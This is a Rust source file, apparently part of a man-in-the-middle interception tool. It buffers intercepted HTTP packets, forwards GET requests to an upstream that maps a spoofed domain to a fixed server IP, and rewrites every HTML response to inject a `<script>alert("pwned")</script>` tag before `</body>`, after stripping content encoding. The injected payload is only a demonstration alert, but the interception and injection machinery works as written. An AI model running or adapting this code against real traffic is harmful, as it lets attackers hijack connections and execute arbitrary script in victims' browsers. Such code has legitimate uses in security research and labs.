use std::collections::HashMap;
use std::fmt::Write;
use std::io;
use std::io::Read;

use anyhow::{Result, bail};
use http::header::{CONNECTION, CONTENT_ENCODING, CONTENT_LENGTH, CONTENT_TYPE};
use http::response::Parts;
use http::{HeaderMap, HeaderName, HeaderValue};
use httparse::Status;

use crate::constants::SERVER_IP;
use crate::models::ConnectionId;
use crate::upstream::UpstreamsManager;

const READ_BUFFER_SIZE: usize = 1024;

fn format_response(mut head: Parts, mut body: Vec<u8>) -> Result<(Vec<u8>, usize)> {
    let mut formatted = String::new();
    write!(
        &mut formatted,
        "HTTP/1.1 {} {}\r\n",
        head.status.as_u16(),
        head.status.canonical_reason().unwrap_or("")
    )?;

    format_headers(&mut head.headers, body.len(), &mut formatted)?;

    formatted.push_str("\r\n");

    let mut result = formatted.into_bytes();

    result.append(&mut body);

    let length = result.len();

    Ok((result, length))
}

fn format_headers(headers: &mut HeaderMap, body_len: usize, output: &mut String) -> Result<()> {
    headers.insert(CONNECTION, HeaderValue::from_static("Close"));
    headers.remove(CONTENT_ENCODING);
    headers.insert(CONTENT_LENGTH, HeaderValue::from(body_len));

    for (name, value) in headers.iter() {
        write!(output, "{}: {}\r\n", name.as_str(), value.to_str()?)?;
    }
    Ok(())
}

pub struct HttpHandlerOptions {
    pub is_underlying_layer_encrypted: bool,
    pub conn_id: ConnectionId,
}

pub struct HttpHandler {
    active_connections_data: HashMap<ConnectionId, Vec<u8>>,
    upstreams_manager: UpstreamsManager,
}

impl HttpHandler {
    pub fn new() -> Self {
        let static_domains = [(String::from("domain.com"), SERVER_IP.parse().unwrap())]
            .into_iter()
            .collect();

        Self {
            active_connections_data: HashMap::default(),
            upstreams_manager: UpstreamsManager::new(static_domains),
        }
    }

    /// Handle new data for incoming http requests.
    ///
    /// ## Returns
    ///
    /// - Ok(Vec<u8>) to send a reponse
    /// - Ok(None) to ignore the packet
    /// - Err on error    
    pub fn handle_packet<R: Read>(
        &mut self,
        packet: &mut R,
        options: &HttpHandlerOptions,
    ) -> Result<Option<Vec<u8>>> {
        log::trace!("received http packet...");

        let active_connection_data = self
            .active_connections_data
            .entry(options.conn_id.clone())
            .or_default();

        loop {
            let mut packet_data = [0u8; READ_BUFFER_SIZE];
            let read_amount = match packet.read(&mut packet_data) {
                Ok(0) => break,
                Ok(read_amount) => read_amount,
                Err(e) if e.kind() == io::ErrorKind::WouldBlock => break,
                Err(e) => bail!(e),
            };

            active_connection_data.extend_from_slice(&packet_data[0..read_amount]);
        }

        let mut headers = [httparse::EMPTY_HEADER; 64];
        let mut request = httparse::Request::new(&mut headers);
        let response = request.parse(active_connection_data)?;
        let headers_size = match response {
            Status::Complete(headers_size) => headers_size,
            Status::Partial => {
                log::debug!("received incomplete request...");
                return Ok(None);
            }
        };

        let content_length = request
            .headers
            .iter()
            .find(|h| h.name.to_ascii_lowercase() == CONTENT_LENGTH.as_str())
            .map(|v| String::from_utf8_lossy(v.value))
            .map(|s| s.to_string())
            .and_then(|s| s.parse::<usize>().ok())
            .unwrap_or(0);

        if headers_size + content_length > active_connection_data.len() {
            log::warn!("not enough body data yet");
            return Ok(None);
        }

        let request_body = &active_connection_data[headers_size..];

        let mut headers = HashMap::new();
        for header in request.headers {
            headers.insert(
                HeaderName::from_bytes(header.name.as_bytes())?,
                HeaderValue::from_bytes(header.value)?,
            );
        }

        let response = match request.method {
            Some(m) => match m {
                "GET" => self.upstreams_manager.get(
                    options.is_underlying_layer_encrypted,
                    request.path,
                    headers,
                    request_body,
                )?,
                m => {
                    bail!("method not handled (yet): {m}")
                }
            },
            None => bail!("cannot intercept request without method"),
        };

        let (head, mut body) = response.into_parts();

        let body = match head.headers.get(CONTENT_TYPE) {
            Some(content_type)
                if content_type == HeaderValue::from_static("text/html; charset=utf-8") =>
            {
                let html = body.read_to_string()?;

                let script = r#"<script>alert("pwned")</script>"#;

                let injected_html = if html.contains("</body>") {
                    html.replacen("</body>", &format!("{script}\n</body>"), 1)
                } else {
                    html
                };

                injected_html.into_bytes()
            }
            Some(_) | None => body.read_to_vec()?,
        };

        let (response_data, _) = format_response(head, body)?;

        Ok(Some(response_data))
    }
}
